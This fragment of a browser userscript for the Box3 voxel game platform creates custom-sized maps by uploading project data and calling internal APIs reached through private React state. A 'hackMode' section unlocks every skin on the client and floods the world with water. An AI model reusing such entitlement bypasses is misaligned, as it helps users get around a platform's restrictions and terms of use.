    const shapeFolder = f.addFolder("地图尺寸");
    const emptyChunk = "QmYUffAgALxiUQonbhAVXjknTq3dNf3AfHQGQ8P5xny7TU";
    const config = {
      shape: {
        x: 128,
        y: 128,
        z: 128
      },
      enableTriggerAPI: false,
      storageMode: "sqlite",
      scriptIndex: "index.js",
      name: "空白自定义地图"
    };
    const create = async () => {
      const errors = [];
      const V = config.shape.x * config.shape.y * config.shape.z;
      if (V >= 67108864) {
        errors.push("地图总体积不得超过67108864");
      }
      if (!/^.+\.js$/.test(config.scriptIndex)) {
        errors.push("脚本入口错误");
      }
      if (errors.length > 0) {
        return Swal.fire({
          title: `输入有误`,
          html: "您输入的参数存在以下问题<br/>" + errors.map((i) => "⚠ " + i).join("<br/>"),
          icon: "error"
        });
      }
      try {
        let buildVoxelChunks = function() {
          var chunks = [], xx = config.shape.x / 32, yy = config.shape.y / 32, zz = config.shape.z / 32;
          for (let i = 1; i < zz; i++) {
            chunks = chunks.concat(
              new Array(xx - 1).fill(
                "QmY4M7B58dARVAJyYf7aonuGjNnaUFUusCQXq9tmifLEKY"
              )
            );
            chunks.push("Qmcoad9FnMdKGbxn5ifLdCaivVi6T7E2bmDVAdJbwuRD2a");
            chunks = chunks.concat(new Array((yy - 1) * xx).fill(emptyChunk));
          }
          chunks = chunks.concat(
            new Array(xx - 1).fill(
              "QmaCUNCe7XDEnXJqprgikquGk6H5nkMegxi77h2aaRyc2b"
            )
          );
          chunks.push("QmX49DZMGEY9ANyzfbrWhiEKk1hkz9SRpFn2NTKMRUjQzj");
          chunks = chunks.concat(new Array((yy - 1) * xx).fill(emptyChunk));
          return chunks;
        };
        const voxelsHash = (await uploadHash(
          JSON.stringify({
            chunks: buildVoxelChunks(),
            shape: config.shape
          })
        )).Key;
        console.log("Voxels Hash", voxelsHash);
        const projectHash = (await uploadHash(
          JSON.stringify({
            ambientSound: "QmcNbLSSQfVcDpH9jSX38RSVrL1SZK3vNMZwaP7cMkKqvY",
            assets: "QmQ7F5ee4rxLn5UQgjKrrtaX1Qif1P48NxYiSv3damw5G3",
            collisionFilter: [],
            committerId: 0,
            deleteAssets: "QmTgK2uYPscacJ9KaBS8tryXRF5mvjuRbubF7h9bG2GgoN",
            editRoot: "QmTgK2uYPscacJ9KaBS8tryXRF5mvjuRbubF7h9bG2GgoN",
            entities: "QmSvPd3sHK7iWgZuW47fyLy4CaZQe2DwxvRhrJ39VpBVMK",
            environment: "QmSnYEH7wPftKcr8qDaBWf5PrbHrqKbqEhTUthQsDuhPqV",
            features: { enableTriggerAPI: config.enableTriggerAPI },
            folders: "QmSvPd3sHK7iWgZuW47fyLy4CaZQe2DwxvRhrJ39VpBVMK",
            info: "QmbpXhRWRMdN4y6CZ4VsPXkkuNfvFSPoSkKn86BVzYh26w",
            physics: "QmTzt6Z6Mm11NQjTeXspDMJtddzDadzwhgwfWUtNG5XCrD",
            player: "QmUMttRLjZYCpW6gLBiLZsCq3VNjWCnK4NtqYaBYJ1GCyh",
            prevHash: "QmcfC4xGX69j1dcgUb3gZS9a9qjCR8aVah1PjQspUVNYvH",
            scriptAssets: "Qmcv3WHWrFohnJXxk2qdV2hk6CE6vQ4BzWMVsE2qFVXV9j",
            scriptIndex: config.scriptIndex,
            storageMode: config.storageMode,
            timestamp: new Date().toISOString(),
            type: "project",
            version: "0.3.11",
            voxels: voxelsHash,
            zones: "QmTgK2uYPscacJ9KaBS8tryXRF5mvjuRbubF7h9bG2GgoN"
          })
        )).Key;
        console.log("Project Hash", projectHash);
        const containerName = await document.querySelector(".app")._reactRootContainer._internalRoot.current.updateQueue.baseState.element.props.children.props.website.rpc.container.api.createGameEdit(
          { hash: projectHash, name: config.name }
        );
        console.log("Edit container", containerName);
        const editHref = `https://box3.codemao.cn/e/${containerName.slice(5)}`;
        console.log("Edit href", editHref);
        if ((await Swal.fire({
          title: "创建完成",
          text: "已使用自定义参数创建地图",
          icon: "success",
          confirmButtonText: "进入地图"
        })).isConfirmed) {
          location.href = editHref;
        }
      } catch (e) {
        Swal.fire("创建失败", String(e), "error");
      }
      return;
    };
    shapeFolder.add(config.shape, "x", 32, 1024, 32);
    shapeFolder.add(config.shape, "y", 32, 1024, 32);
    shapeFolder.add(config.shape, "z", 32, 1024, 32);
    f.add(config, "enableTriggerAPI").name("启用TriggerAPI");
    f.add(config, "scriptIndex").name("脚本入口文件");
    f.add(config, "storageMode", ["sqlite", "pg"]).name("数据库引擎");
    f.add(config, "name").name("地图名称");
    addFunctionButton(f, create, "创建自定义地图");
  }
  function MapContent(gui2) {
    const f = gui2.addFolder("地图工具");
    _CustomMap(f);
  }
  const MapContent$1 = /* @__PURE__ */ Object.freeze(/* @__PURE__ */ Object.defineProperty({
    __proto__: null,
    default: MapContent
  }, Symbol.toStringTag, { value: "Module" }));
  async function Play(gui2) {
    const f = gui2.addFolder("游玩模式");
    const rootElement = await waitElement("#react-container");
    function getCore() {
      return rootElement._reactRootContainer._internalRoot.current.updateQueue.baseState.element.props.children.props.children.props;
    }
    await waitUntil(() => getCore() && getCore().state);
    const state = getCore().state;
    await waitUntil(() => state.box3.state.appState === 2);
    const waitLabel = addLabel(f, "等待进入地图");
    Object.assign(unsafeWindow, { core: getCore(), state });
    waitLabel.destroy();
    addFunctionButton(
      f,
      async () => {
        state.box3.state.chat.log = [];
      },
      "清空聊天"
    );
    if (settings["flag.hackMode"]) {
      console.log("PlayMode Hack Enabled.");
      Object.assign(unsafeWindow, {
        async getAllSkin() {
          const stop = startLoading();
          state.box3.state.secret.availableSkin = (await getCore().brpc.skin.api.getAll()).map((e) => e.name);
          stop();
          Swal.fire("Got all skins", "", "success");
        },
        async fillWaterWorld() {
          for (let x = 0; x < state.box3.state.voxel.shape[0]; x++)
            for (let y = 0; y < state.box3.state.voxel.shape[1]; y++)
              for (let z = 0; z < state.box3.state.voxel.shape[2]; z++)
                if (state.box3.voxel.getVoxel(x, y, z) === 0)
                  state.box3.voxel._setVoxel(x, y, z, 364);
        },
        async clearWater() {
          for (let x = 0; x < state.box3.state.voxel.shape[0]; x++)
            for (let y = 0; y < state.box3.state.voxel.shape[1]; y++)
              for (let z = 0; z < state.box3.state.voxel.shape[2]; z++)
                if (state.box3.voxel.getVoxel(x, y, z) === 364)
                  state.box3.voxel._setVoxel(x, y, z, 0);
        }
      });
    }
    GraphicSettings(getCore, state, f);
  }
  const Play$1 = /* @__PURE__ */ Object.freeze(/* @__PURE__ */ Object.defineProperty({
    __proto__: null,
    default: Play
  }, Symbol.toStringTag, { value: "Module" }));
})();
